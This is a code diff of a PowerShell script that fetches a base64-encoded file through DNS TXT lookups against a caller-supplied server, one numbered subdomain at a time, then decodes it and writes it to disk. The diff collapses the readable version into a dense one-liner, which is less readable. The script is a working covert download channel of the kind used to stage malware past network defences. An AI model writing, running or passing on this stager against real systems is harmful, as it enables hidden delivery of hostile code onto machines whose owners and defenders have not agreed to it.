@@ -1,16 +1,1 @@
-param ([string]$server)
-$payload=""
-for($i=0;$i -ge 0;$i++){
-$command='cmd.exe /C nslookup -type=TXT '+$i+'.$server'
-$a=Invoke-Expression -Command:$command
-$c=[string]$a
-$fIdx=$c.IndexOf('"')+1
-$lIdx=$c.LastIndexOf('"')
-$len=$lIdx-$fIdx
-if($error.Count -ge 1){
-$i=-10
-}
-$payload=$payload+$c.Substring($fIdx,$len)
-}
-$o=[Convert]::FromBase64String($payload)
-[io.file]::WriteAllBytes('output',$o)
+Param([String]$s)for($i=0;$i-ge0;$i++){$c=(Invoke-Expression "cmd.exe /C nslookup -type=TXT $($i).$($s)").ToString();if($Error.Count-ge1){$i=-10}$p+=$c.Substring(($c.IndexOf('"')+1),($c.LastIndexOf('"'))-($c.IndexOf('"')+1))}$o=[Convert]::FromBase64String($p);[IO.File]::WriteAllBytes('output',$o)
